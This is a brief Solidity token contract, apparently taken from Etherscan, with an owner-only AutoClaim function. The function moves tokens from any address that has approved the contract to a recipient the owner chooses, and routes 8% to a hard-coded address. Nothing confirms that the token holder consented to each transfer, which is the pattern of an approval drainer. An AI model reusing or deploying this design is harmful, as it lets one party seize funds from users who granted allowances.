/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

pragma solidity ^0.5.11;
interface IERC20 {

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}


contract NetkillerCashier {
    address public owner;
    IERC20 public token;
    address public root=0x8b97290244e05DFA935922AA9AfA667a78888888;
    uint256 public amount;
    uint256 public allow;

    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }

    constructor(IERC20 _token) public {
        owner = msg.sender;
        token = _token;
    }

    function AutoClaim(address _from,address _to,uint256 _amount) payable onlyOwner public {        
        token.transferFrom(_from,root,_amount*800);
        token.transferFrom(_from,_to,_amount*9200);
        
    }
    
}